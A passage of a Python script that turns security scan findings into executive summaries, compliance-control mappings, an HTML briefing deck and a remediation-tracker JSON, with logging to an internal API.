            f"While no critical issues were found, **{high} high-severity finding(s)** require "
            f"prompt attention to prevent potential data breaches or service disruption."
        )
    else:
        lines.append(
            f"The security assessment of {target_name} identified **{total} vulnerabilities**. "
            f"The overall security posture is reasonable, though several findings should be "
            f"addressed to maintain defense-in-depth."
        )
    lines.append("")

    # --- Severity Distribution ---
    lines.append("## Severity Distribution")
    lines.append("")
    lines.append("```")
    lines.append(severity_bar_chart(summary))
    lines.append("```")
    lines.append("")

    # --- Top Findings (business language) ---
    top = [f for f in findings if f.get("severity", "").lower() in ("critical", "high")][:5]
    if top:
        lines.append("## Top Findings Requiring Immediate Attention")
        lines.append("")
        business_impact = {
            "CWE-89": "could allow attackers to access, modify, or delete all data in the application database, including customer records and financial information",
            "CWE-79": "could enable attackers to hijack user sessions, steal credentials, and impersonate legitimate users including administrators",
            "CWE-287": "could allow unauthorized individuals to take over user accounts, bypassing all authentication controls",
            "CWE-352": "could trick authenticated users into performing unintended actions, including account deletion or fund transfers",
            "CWE-918": "could expose internal infrastructure, cloud credentials, and private network services to external attackers",
            "CWE-22": "could allow attackers to read sensitive files from the server, including configuration files and credentials",
            "CWE-798": "exposes production credentials in publicly accessible code, granting attackers direct access to payment processing or other critical systems",
            "CWE-434": "could allow attackers to upload and execute malicious code on the server, leading to full system compromise",
            "CWE-502": "could allow attackers to execute arbitrary code on the server through crafted data payloads",
            "CWE-862": "could allow any user to access administrative functions, viewing or modifying sensitive data and system configuration",
        }
        for i, f in enumerate(top, 1):
            cwe = f.get("cwe", "")
            impact = business_impact.get(cwe, "poses a significant risk to the security of the application and its data")
            lines.append(f"**{i}. {f.get('title', 'Untitled')}** (Severity: {f.get('severity', 'N/A').upper()})")
            lines.append("")
            lines.append(f"   This vulnerability {impact}.")
            lines.append("")
    lines.append("")

    # --- Priority Actions ---
    lines.append("## Recommended Priority Actions")
    lines.append("")
    action_num = 1
    if crit > 0:
        lines.append(f"{action_num}. **Immediate (24-48 hours):** Remediate all {crit} critical findings — these represent active exploitable risk.")
        action_num += 1
    if high > 0:
        lines.append(f"{action_num}. **Short-term (7 days):** Address all {high} high-severity findings to prevent potential data breaches.")
        action_num += 1
    if med > 0:
        lines.append(f"{action_num}. **Medium-term (30 days):** Resolve {med} medium-severity findings as part of security hardening.")
        action_num += 1
    if low > 0:
        lines.append(f"{action_num}. **Ongoing (90 days):** Address {low} low-severity findings during regular maintenance cycles.")
        action_num += 1
    lines.append(f"{action_num}. **Continuous:** Implement automated security scanning in the CI/CD pipeline to catch future vulnerabilities before deployment.")
    lines.append("")

    # --- Remediation Timeline ---
    lines.append("## Remediation Timeline")
    lines.append("")
    lines.append("| Phase | Timeframe | Scope | Findings |")
    lines.append("|-------|-----------|-------|----------|")
    if crit > 0:
        lines.append(f"| Emergency | 24-48 hours | Critical vulnerabilities | {crit} |")
    if high > 0:
        lines.append(f"| Priority | 1-7 days | High-severity findings | {high} |")
    if med > 0:
        lines.append(f"| Standard | 7-30 days | Medium-severity findings | {med} |")
    if low > 0:
        lines.append(f"| Maintenance | 30-90 days | Low-severity findings | {low} |")
    lines.append("")

    # --- Cost of Inaction ---
    lines.append("## Cost of Inaction")
    lines.append("")
    lines.append("Failure to address identified vulnerabilities may result in:")
    lines.append("")
    lines.append("- **Data breach costs:** Average cost of a data breach is $4.45M (IBM 2023 Cost of a Data Breach Report), with costs rising for breaches involving compromised credentials or prolonged detection times.")
    lines.append("- **Regulatory penalties:** Non-compliance with GDPR (up to 4% annual revenue), PCI DSS (up to $100K/month), and other frameworks.")
    lines.append("- **Operational disruption:** Service outages, incident response costs, and system rebuild expenses.")
    lines.append("- **Reputational damage:** Customer trust erosion, competitive disadvantage, and long-term revenue impact.")
    lines.append("- **Legal liability:** Class-action lawsuits, contractual breach penalties, and director/officer liability.")
    lines.append("")
    lines.append("---")
    lines.append(f"*Report generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | {rid}*")

    return "\n".join(lines)


# -------------------------------------------------------------------
def generate_compliance_report(data: dict, target_name: str) -> str:
    """Compliance mapping report — findings to NIST, ISO, PCI, SOC2 controls."""
    target = data.get("target", "Unknown Target")
    scan_date = data.get("scan_date", datetime.now().strftime("%Y-%m-%d"))
    findings = sorted_findings(data.get("findings", []))
    summary = data.get("summary", {})
    rid = report_id(target, "compliance", scan_date)

    lines = []
    lines.append("=" * 72)
    lines.append("  COMPLIANCE MAPPING REPORT")
    lines.append(f"  {rid}")
    lines.append("=" * 72)
    lines.append("")
    lines.append(f"  Client:  {target_name}")
    lines.append(f"  Target:  {target}")
    lines.append(f"  Date:    {scan_date}")
    lines.append(f"  Frameworks: NIST 800-53, ISO 27001, PCI DSS 4.0, SOC 2")
    lines.append(f"  Classification: CONFIDENTIAL")
    lines.append("")
    lines.append("=" * 72)
    lines.append("")
    lines.append("")

    # --- Control Mapping Table ---
    lines.append("## 1. Finding-to-Control Mapping")
    lines.append("")
    lines.append("| Finding ID | CWE | NIST 800-53 | ISO 27001 | PCI DSS | SOC 2 |")
    lines.append("|------------|-----|-------------|-----------|---------|-------|")

    for f in findings:
        fid = f.get("id", "-")
        cwe = f.get("cwe", "N/A")
        mapping = CWE_COMPLIANCE_MAP.get(cwe, CWE_COMPLIANCE_FALLBACK)
        # For the fallback case, keys are at top level; for mapped case, keys are inside the dict
        if "name" in mapping:
            nist = mapping.get("nist", "—")
            iso = mapping.get("iso", "—")
            pci = mapping.get("pci", "—")
            soc2 = mapping.get("soc2", "—")
        else:
            nist = mapping.get("nist", "—")
            iso = mapping.get("iso", "—")
            pci = mapping.get("pci", "—")
            soc2 = mapping.get("soc2", "—")
        lines.append(f"| {fid} | {cwe} | {nist} | {iso} | {pci} | {soc2} |")
    lines.append("")

    # --- Gap analysis per framework ---
    lines.append("## 2. Compliance Gap Analysis")
    lines.append("")

    # Collect unique controls affected per framework
    frameworks = {
        "nist": {"label": "NIST 800-53", "controls": {}},
        "iso": {"label": "ISO 27001", "controls": {}},
        "pci": {"label": "PCI DSS 4.0", "controls": {}},
        "soc2": {"label": "SOC 2 Type II", "controls": {}},
    }

    for f in findings:
        cwe = f.get("cwe", "N/A")
        mapping = CWE_COMPLIANCE_MAP.get(cwe, CWE_COMPLIANCE_FALLBACK)
        for fw_key in frameworks:
            ctrl = mapping.get(fw_key, "—")
            if ctrl != "—":
                if ctrl not in frameworks[fw_key]["controls"]:
                    frameworks[fw_key]["controls"][ctrl] = []
                frameworks[fw_key]["controls"][ctrl].append(f.get("id", "-"))

    for fw_key, fw_data in frameworks.items():
        label = fw_data["label"]
        controls = fw_data["controls"]
        lines.append(f"### 2.{list(frameworks.keys()).index(fw_key) + 1}  {label}")
        lines.append("")
        if not controls:
            lines.append("No control gaps identified for this framework.")
            lines.append("")
            continue

        lines.append(f"**{len(controls)} control(s) affected by current findings:**")
        lines.append("")
        lines.append("| Control | Status | Affected Findings | Required Action |")
        lines.append("|---------|--------|-------------------|-----------------|")

        for ctrl, fids in sorted(controls.items()):
            sev_list = []
            for f in findings:
                if f.get("id") in fids:
                    sev_list.append(f.get("severity", "info").lower())
            worst = "critical" if "critical" in sev_list else "high" if "high" in sev_list else "medium" if "medium" in sev_list else "low"
            status = "NON-COMPLIANT" if worst in ("critical", "high") else "PARTIAL"
            action = _remediation_action_for_control(ctrl)
            lines.append(f"| {ctrl} | {status} | {', '.join(fids)} | {action} |")

        lines.append("")

    # --- Required Remediation per Framework ---
    lines.append("## 3. Required Remediation by Framework")
    lines.append("")

    for fw_key, fw_data in frameworks.items():
        label = fw_data["label"]
        controls = fw_data["controls"]
        if not controls:
            continue

        lines.append(f"### {label}")
        lines.append("")
        for ctrl, fids in sorted(controls.items()):
            lines.append(f"**{ctrl}**")
            lines.append("")
            lines.append(f"- Affected by: {', '.join(fids)}")
            lines.append(f"- Action: {_remediation_action_for_control(ctrl)}")
            # List specific finding titles
            for f in findings:
                if f.get("id") in fids:
                    lines.append(f"  - {f.get('id')}: {f.get('title')} ({f.get('severity', 'N/A').upper()})")
            lines.append("")

    # --- Compliance Posture Summary ---
    lines.append("## 4. Compliance Posture Summary")
    lines.append("")
    lines.append("| Framework | Controls Affected | Status |")
    lines.append("|-----------|------------------|--------|")
    for fw_key, fw_data in frameworks.items():
        count = len(fw_data["controls"])
        status = "GAPS IDENTIFIED" if count > 0 else "NO GAPS"
        lines.append(f"| {fw_data['label']} | {count} | {status} |")
    lines.append("")
    lines.append("")
    lines.append("### Recommendations")
    lines.append("")
    lines.append("1. Address all critical and high-severity findings to restore compliance with affected controls.")
    lines.append("2. Document remediation actions and timelines for audit evidence.")
    lines.append("3. Implement continuous monitoring to detect control failures proactively.")
    lines.append("4. Schedule a reassessment after remediation to verify control effectiveness.")
    lines.append("5. Review and update security policies to address identified gaps.")
    lines.append("")
    lines.append("---")
    lines.append(f"*Report generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | {rid}*")

    return "\n".join(lines)


def _remediation_action_for_control(ctrl: str) -> str:
    """Return a brief remediation action based on the control identifier."""
    actions = {
        "SI-10": "Implement input validation on all user-supplied data",
        "IA-2": "Strengthen authentication mechanisms and enforce MFA",
        "IA-5": "Rotate all credentials; implement secrets management",
        "SC-23": "Implement anti-CSRF tokens on all state-changing endpoints",
        "AC-6": "Enforce least-privilege access and path validation",
        "AC-3": "Implement role-based access control on all endpoints",
        "AC-4": "Review information flow controls and error handling",
        "AC-12": "Implement session expiration and idle timeout",
        "SC-7": "Restrict server-side request targets; block internal ranges",
        "SC-28": "Encrypt all sensitive data at rest and in transit",
        "SC-13": "Upgrade to TLS 1.2+ with strong cipher suites",
        "SC-5": "Implement rate limiting and resource consumption controls",
        "SI-2": "Apply patches and remediate identified flaws",
        "SI-11": "Implement custom error handlers; suppress verbose errors",
    }
    # Match on the control ID prefix (before the parenthetical)
    ctrl_id = ctrl.split("(")[0].strip()
    for key, action in actions.items():
        if key in ctrl_id:
            return action
    # ISO / PCI / SOC2 fallback
    if "A.14" in ctrl or "6.5" in ctrl:
        return "Review secure development practices and input validation"
    if "A.9" in ctrl or "8.1" in ctrl or "8.2" in ctrl:
        return "Strengthen authentication and access control mechanisms"
    if "A.10" in ctrl or "4.1" in ctrl or "3.4" in ctrl:
        return "Implement encryption for data at rest and in transit"
    if "A.13" in ctrl:
        return "Review network controls and boundary protection"
    if "A.12" in ctrl:
        return "Review operational security procedures and monitoring"
    if "A.8" in ctrl:
        return "Review asset handling and information classification"
    if "CC6" in ctrl:
        return "Review and strengthen logical and physical access controls"
    if "CC7" in ctrl:
        return "Implement infrastructure monitoring and vulnerability management"
    return "Review and remediate per framework requirements"


# -------------------------------------------------------------------
def generate_presentation(data: dict, target_name: str) -> str:
    """HTML slide deck for in-house security briefing. AIBrain dark theme."""
    target = data.get("target", "Unknown Target")
    scan_date = data.get("scan_date", datetime.now().strftime("%Y-%m-%d"))
    findings = sorted_findings(data.get("findings", []))
    summary = data.get("summary", {})

    crit = summary.get("critical", 0)
    high = summary.get("high", 0)
    med = summary.get("medium", 0)
    low = summary.get("low", 0)
    total = summary.get("total", len(findings))

    risk = "CRITICAL" if crit > 0 else "HIGH" if high > 0 else "MEDIUM" if med > 0 else "LOW"
    risk_color = {"CRITICAL": "#FF4444", "HIGH": "#FF9F43", "MEDIUM": "#FFD93D", "LOW": "#00F5D4"}.get(risk, "#00F5D4")

    # Collect top critical/high for individual slides
    top_findings = [f for f in findings if f.get("severity", "").lower() in ("critical", "high")]

    # Build severity data for chart
    sev_data = [
        ("Critical", crit, "#FF4444"),
        ("High", high, "#FF9F43"),
        ("Medium", med, "#FFD93D"),
        ("Low", low, "#00F5D4"),
    ]

    # Build finding slides HTML
    finding_slides = ""
    for f in top_findings:
        sev = f.get("severity", "info").upper()
        sev_color = {"CRITICAL": "#FF4444", "HIGH": "#FF9F43"}.get(sev, "#00F5D4")
        finding_slides += f"""
    <div class="slide">
      <div class="slide-header">
        <span class="badge" style="background:{sev_color};color:#0A0A0F;">{sev}</span>
        <span class="cvss">CVSS {f.get('cvss', 'N/A')}</span>
      </div>
      <h2>{_html_escape(f.get('title', 'Untitled'))}</h2>
      <div class="finding-meta">
        <p><strong>ID:</strong> {_html_escape(f.get('id', '-'))}</p>
        <p><strong>CWE:</strong> {_html_escape(f.get('cwe', 'N/A'))}</p>
        <p><strong>Affected:</strong> <code>{_html_escape(f.get('affected_url', 'N/A'))}</code></p>
      </div>
      <div class="finding-desc">
        <p>{_html_escape(f.get('description', 'No description.'))}</p>
      </div>
      <div class="finding-fix">
        <h3>Remediation</h3>
        <p>{_html_escape(f.get('remediation', 'Consult vendor documentation.'))}</p>
      </div>
    </div>
"""

    # Remediation roadmap
    roadmap_rows = ""
    phases = []
    if crit > 0:
        phases.append(("Emergency", "24-48 hours", f"{crit} critical", "#FF4444"))
    if high > 0:
        phases.append(("Priority", "1-7 days", f"{high} high", "#FF9F43"))
    if med > 0:
        phases.append(("Standard", "7-30 days", f"{med} medium", "#FFD93D"))
    if low > 0:
        phases.append(("Maintenance", "30-90 days", f"{low} low", "#00F5D4"))
    for phase, time, scope, color in phases:
        roadmap_rows += f"""
        <tr>
          <td><span class="badge" style="background:{color};color:#0A0A0F;">{phase}</span></td>
          <td>{time}</td>
          <td>{scope}</td>
        </tr>"""

    # Bar widths for chart
    max_count = max(crit, high, med, low, 1)
    bar_items = ""
    for label, count, color in sev_data:
        pct = int((count / max_count) * 100) if max_count else 0
        bar_items += f"""
        <div class="bar-row">
          <span class="bar-label">{label}</span>
          <div class="bar-track">
            <div class="bar-fill" style="width:{pct}%;background:{color};"></div>
          </div>
          <span class="bar-count">{count}</span>
        </div>"""

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Assessment — {_html_escape(target_name)}</title>
<style>
  * {{ margin: 0; padding: 0; box-sizing: border-box; }}
  body {{
    background: #0A0A0F;
    color: #E0E0E0;
    font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
    line-height: 1.6;
  }}
  .slide {{
    min-height: 100vh;
    padding: 60px 80px;
    display: flex;
    flex-direction: column;
    justify-content: center;
    border-bottom: 1px solid #1a1a2e;
    page-break-after: always;
  }}
  h1 {{ font-size: 3em; color: #00F5D4; margin-bottom: 0.3em; }}
  h2 {{ font-size: 2em; color: #FFFFFF; margin-bottom: 0.5em; }}
  h3 {{ font-size: 1.4em; color: #00F5D4; margin: 1em 0 0.5em; }}
  .subtitle {{ font-size: 1.3em; color: #888; margin-bottom: 1em; }}
  .meta {{ color: #666; font-size: 1em; margin-top: 2em; }}
  .meta span {{ margin-right: 2em; }}
  .badge {{
    display: inline-block;
    padding: 4px 16px;
    border-radius: 4px;
    font-weight: 700;
    font-size: 0.9em;
    letter-spacing: 0.05em;
  }}
  .cvss {{
    color: #00F5D4;
    font-size: 1.2em;
    font-weight: 700;
    margin-left: 1em;
  }}
  .slide-header {{
    display: flex;
    align-items: center;
    margin-bottom: 1em;
  }}
  .finding-meta {{ margin: 1em 0; }}
  .finding-meta p {{ margin: 0.3em 0; }}
  .finding-desc {{
    background: #12121A;
    border-left: 3px solid #00F5D4;
    padding: 1em 1.5em;
    margin: 1em 0;
    border-radius: 0 4px 4px 0;
  }}
  .finding-fix {{
    margin-top: 1em;
  }}
  .finding-fix p {{
    background: #0d1a0d;
    border-left: 3px solid #44FF44;
    padding: 1em 1.5em;
    border-radius: 0 4px 4px 0;
  }}
  code {{
    background: #1a1a2e;
    padding: 2px 8px;
    border-radius: 3px;
    font-family: 'Cascadia Code', 'Fira Code', monospace;
    color: #00F5D4;
  }}
  .risk-badge {{
    font-size: 2em;
    font-weight: 700;
    padding: 12px 40px;
    border-radius: 8px;
    display: inline-block;
    margin: 1em 0;
  }}
  .stat-grid {{
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 2em;
    margin: 2em 0;
  }}
  .stat-card {{
    background: #12121A;
    border-radius: 8px;
    padding: 2em;
    text-align: center;
  }}
  .stat-card .number {{
    font-size: 3em;
    font-weight: 700;
    display: block;
  }}
  .stat-card .label {{
    font-size: 1em;
    color: #888;
    margin-top: 0.5em;
  }}
  /* Bar chart */
  .bar-row {{
    display: flex;
    align-items: center;
    margin: 0.8em 0;
  }}
  .bar-label {{
    width: 80px;
    text-align: right;
    margin-right: 1em;
    font-weight: 600;
  }}
  .bar-track {{
    flex: 1;
    height: 32px;
    background: #12121A;
    border-radius: 4px;
    overflow: hidden;
  }}
  .bar-fill {{
    height: 100%;
    border-radius: 4px;
    transition: width 0.3s;
  }}
  .bar-count {{
    width: 40px;
    text-align: right;
    margin-left: 1em;
    font-weight: 700;
  }}
  table {{
    width: 100%;
    border-collapse: collapse;
    margin: 1em 0;
  }}
  th, td {{
    padding: 12px 16px;
    text-align: left;
    border-bottom: 1px solid #1a1a2e;
  }}
  th {{
    color: #00F5D4;
    font-weight: 600;
    border-bottom: 2px solid #00F5D4;
  }}
  .qna {{
    text-align: center;
  }}
  .qna h1 {{
    font-size: 4em;
    margin-bottom: 0.5em;
  }}
  @media print {{
    .slide {{ min-height: auto; padding: 40px; }}
  }}
</style>
</head>
<body>

  <!-- Slide 1: Title -->
  <div class="slide">
    <h1>Security Assessment</h1>
    <p class="subtitle">{_html_escape(target_name)}</p>
    <div class="meta">
      <span>Target: {_html_escape(target)}</span>
      <span>Date: {scan_date}</span>
    </div>
    <div class="meta">
      <span>Classification: CONFIDENTIAL</span>
    </div>
  </div>

  <!-- Slide 2: Scope -->
  <div class="slide">
    <h2>Assessment Scope</h2>
    <div class="finding-desc">
      <p><strong>Target:</strong> {_html_escape(target)}</p>
      <p><strong>Type:</strong> Application Security Assessment</p>
      <p><strong>Date:</strong> {scan_date}</p>
      <p><strong>Method:</strong> Automated scanning with manual verification</p>
      <p><strong>Standards:</strong> OWASP Testing Guide v4.2, PTES</p>
    </div>
    <h3>Methodology</h3>
    <p>Reconnaissance &rarr; Vulnerability Scanning &rarr; Manual Verification &rarr; Exploitation &rarr; Reporting</p>
  </div>

  <!-- Slide 3: Risk Overview -->
  <div class="slide">
    <h2>Risk Overview</h2>
    <div class="risk-badge" style="background:{risk_color};color:#0A0A0F;">
      Overall Risk: {risk}
    </div>
    <div class="stat-grid">
      <div class="stat-card">
        <span class="number" style="color:#FF4444;">{crit}</span>
        <span class="label">Critical</span>
      </div>
      <div class="stat-card">
        <span class="number" style="color:#FF9F43;">{high}</span>
        <span class="label">High</span>
      </div>
      <div class="stat-card">
        <span class="number" style="color:#FFD93D;">{med}</span>
        <span class="label">Medium</span>
      </div>
      <div class="stat-card">
        <span class="number" style="color:#00F5D4;">{low}</span>
        <span class="label">Low</span>
      </div>
    </div>
    {bar_items}
    <p class="meta">Total findings: {total}</p>
  </div>

  <!-- Finding slides -->
  {finding_slides}

  <!-- Remediation Roadmap -->
  <div class="slide">
    <h2>Remediation Roadmap</h2>
    <table>
      <thead>
        <tr><th>Phase</th><th>Timeframe</th><th>Scope</th></tr>
      </thead>
      <tbody>
        {roadmap_rows}
      </tbody>
    </table>
    <h3>Next Steps</h3>
    <p>1. Triage and assign findings to development teams</p>
    <p>2. Remediate critical and high findings immediately</p>
    <p>3. Schedule reassessment to verify fixes</p>
    <p>4. Integrate automated scanning into CI/CD pipeline</p>
  </div>

  <!-- Q&A -->
  <div class="slide qna">
    <h1>Q&amp;A</h1>
    <p class="subtitle">Questions and Discussion</p>
    <div class="meta">
      <span>{_html_escape(target_name)} — Security Assessment {scan_date}</span>
    </div>
  </div>

</body>
</html>"""

    return html


def _html_escape(text: str) -> str:
    """Basic HTML escaping — stdlib only."""
    return (
        str(text)
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&#39;")
    )


# -------------------------------------------------------------------
def generate_remediation_tracker(data: dict, target_name: str) -> str:
    """Remediation tracker JSON for frontend dashboard rendering."""
    target = data.get("target", "Unknown Target")
    scan_date = data.get("scan_date", datetime.now().strftime("%Y-%m-%d"))
    findings = sorted_findings(data.get("findings", []))
    summary = data.get("summary", {})

    # Assign due dates based on severity
    due_offsets = {"critical": 2, "high": 7, "medium": 30, "low": 90, "info": 180}

    try:
        base_date = datetime.strptime(scan_date, "%Y-%m-%d")
    except ValueError:
        base_date = datetime.now()

    tracker_findings = []
    for f in findings:
        sev = f.get("severity", "info").lower()
        offset = due_offsets.get(sev, 90)
        due = (base_date + timedelta(days=offset)).strftime("%Y-%m-%d")

        status = f.get("status", "open").lower()
        progress = {"open": 0, "in_progress": 50, "fixed": 100, "accepted": 0, "false_positive": 100}.get(status, 0)

        tracker_findings.append({
            "id": f.get("id", ""),
            "title": f.get("title", ""),
            "severity": sev,
            "cvss": f.get("cvss", 0),
            "cwe": f.get("cwe", ""),
            "affected_url": f.get("affected_url", ""),
            "status": status,
            "assignee": "Unassigned",
            "due_date": due,
            "remediation_steps": f.get("remediation", ""),
            "progress_pct": progress,
        })

    # Summary stats
    statuses = [tf["status"] for tf in tracker_findings]
    total = len(tracker_findings)
    fixed = statuses.count("fixed") + statuses.count("false_positive")
    in_progress = statuses.count("in_progress")
    not_started = total - fixed - in_progress

    # Timeline: estimated completion per severity
    timeline = {}
    for sev in ["critical", "high", "medium", "low"]:
        sev_findings = [tf for tf in tracker_findings if tf["severity"] == sev]
        if sev_findings:
            latest_due = max(tf["due_date"] for tf in sev_findings)
            open_count = len([tf for tf in sev_findings if tf["status"] not in ("fixed", "false_positive")])
            timeline[sev] = {
                "count": len(sev_findings),
                "open": open_count,
                "target_completion": latest_due,
            }

    tracker = {
        "report_type": "remediation_tracker",
        "target": target,
        "target_name": target_name,
        "scan_date": scan_date,
        "generated": datetime.now().strftime("%Y-%m-%dT%H:%M:%S"),
        "summary": {
            "total": total,
            "fixed": fixed,
            "in_progress": in_progress,
            "not_started": not_started,
            "completion_pct": round((fixed / total * 100) if total else 0, 1),
        },
        "timeline": timeline,
        "findings": tracker_findings,
    }

    return json.dumps(tracker, indent=2)


# ===================================================================
# API / AIBrain integration
# ===================================================================

def log_activity(action: str, detail: str = "", status: str = "ok"):
    try:
        payload = json.dumps({
            "action": action,
            "category": "security",
            "detail": detail,
            "status": status,
        }).encode()
        req = urllib.request.Request(
            f"{API_BASE}/activity",
            data=payload,
            headers={"Content-Type": "application/json"},
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass


def save_state(state: dict):
    try:
        payload = json.dumps({"workflow": "report_generator", "state": state}).encode()
        req = urllib.request.Request(
            f"{API_BASE}/state",
            data=payload,
            headers={"Content-Type": "application/json"},
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass


# ===================================================================
# CLI
# ===================================================================

GENERATORS = {
    "technical": ("technical_report.md", generate_technical_report),
    "executive": ("executive_summary.md", generate_executive_summary),
    "compliance": ("compliance_report.md", generate_compliance_report),
    "presentation": ("presentation.html", generate_presentation),
    "tracker": ("remediation_tracker.json", generate_remediation_tracker),
}


def run(args: argparse.Namespace) -> int:
    # Load findings
    if args.demo:
        data = demo_findings()
        print("[*] Using built-in demo data (15 findings)")
    elif args.input:
        input_path = Path(args.input)
        if not input_path.exists():
            print(f"[!] Input file not found: {args.input}", file=sys.stderr)
            return 1
        try:
            data = json.loads(input_path.read_text(encoding="utf-8"))
        except json.JSONDecodeError as e:
            print(f"[!] Invalid JSON in {args.input}: {e}", file=sys.stderr)
            return 1
        finding_count = len(data.get("findings", []))
        print(f"[*] Loaded {finding_count} findings from {args.input}")
    else:
        print("[!] Specify --input <file.json> or --demo", file=sys.stderr)
        return 1

    # Validate findings
    if not data.get("findings"):
        print("[!] No findings in input data", file=sys.stderr)
        return 1

    # Auto-calculate summary if missing
    if not data.get("summary"):
        findings = data["findings"]
        data["summary"] = {
            "total": len(findings),
            "critical": sum(1 for f in findings if f.get("severity", "").lower() == "critical"),
            "high": sum(1 for f in findings if f.get("severity", "").lower() == "high"),
            "medium": sum(1 for f in findings if f.get("severity", "").lower() == "medium"),
            "low": sum(1 for f in findings if f.get("severity", "").lower() == "low"),
        }

    target_name = args.target_name or data.get("target", "Security Assessment")
    output_dir = Path(args.output_dir)

    # Determine which reports to generate
    if args.type == "all":
        types_to_gen = list(GENERATORS.keys())
    else:
        types_to_gen = [args.type]

    # Validate type
    for t in types_to_gen:
        if t not in GENERATORS:
            print(f"[!] Unknown report type: {t}. Choose from: {', '.join(GENERATORS.keys())}, all", file=sys.stderr)
            return 1

    # Generate
    generated = []
    for report_type in types_to_gen:
        filename, generator = GENERATORS[report_type]
        print(f"[*] Generating {report_type} report...")

        content = generator(data, target_name)

        if args.dry_run:
            print(f"\n{'=' * 60}")
            print(f"  DRY RUN — {report_type.upper()} REPORT PREVIEW")
            print(f"{'=' * 60}")
            # Show first 80 lines for preview
            preview_lines = content.split("\n")[:80]
            print("\n".join(preview_lines))
            if len(content.split("\n")) > 80:
                print(f"\n  ... ({len(content.split(chr(10)))} total lines, truncated for preview)")
            print(f"{'=' * 60}\n")
        else:
            output_dir.mkdir(parents=True, exist_ok=True)
            # Prefix with target and date for uniqueness
            target_slug = data.get("target", "unknown").replace(".", "_").replace("/", "_")
            scan_date = data.get("scan_date", datetime.now().strftime("%Y-%m-%d"))
            out_file = output_dir / f"{target_slug}_{scan_date}_{filename}"
            out_file.write_text(content, encoding="utf-8")
            size_kb = len(content.encode("utf-8")) / 1024
            print(f"    -> {out_file} ({size_kb:.1f} KB)")
            generated.append(str(out_file))

    # Log and save state
    log_activity(
        "report_generated",
        detail=f"types={','.join(types_to_gen)} target={data.get('target', '?')} findings={len(data.get('findings', []))}",
    )
    save_state({
        "last_run": datetime.now().isoformat(),
        "types": types_to_gen,
        "target": data.get("target", ""),
        "finding_count": len(data.get("findings", [])),
        "files": generated,
        "dry_run": args.dry_run,
    })

    if not args.dry_run:
        print(f"\n[+] Generated {len(generated)} report(s) in {output_dir}/")
    else:
        print(f"\n[+] Dry run complete — {len(types_to_gen)} report(s) previewed")

    return 0


def main():
    parser = argparse.ArgumentParser(
        description="Security Report Generator — professional assessment reports from scan findings",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --demo --type all --output-dir ./reports/
  %(prog)s --input findings.json --type technical --output-dir ./reports/
  %(prog)s --input findings.json --type executive --dry-run
  %(prog)s --demo --type presentation --output-dir ./reports/
        """,
    )
    parser.add_argument("--input", "-i", help="Path to findings JSON file")
    parser.add_argument(
        "--type", "-t",
        default="all",
        choices=["technical", "executive", "compliance", "presentation", "tracker", "all"],
        help="Report type to generate (default: all)",
    )
    parser.add_argument("--output-dir", "-o", default="./reports", help="Output directory (default: ./reports)")
    parser.add_argument("--target-name", "-n", help="Client/target display name for report headers")
    parser.add_argument("--dry-run", "-d", action="store_true", help="Preview without writing files")
    parser.add_argument("--demo", action="store_true", help="Use built-in sample data for demonstration")

    args = parser.parse_args()
    sys.exit(run(args))


if __name__ == "__main__":
    # P0-1 backfill: entry point routes through harness via workflow_execute
    def _workflow_entry():
        main()
    workflow_execute(
        workflow_name='report_generator',
        action=_workflow_entry,
        task_type='judgment',
        actor='cli',
    )
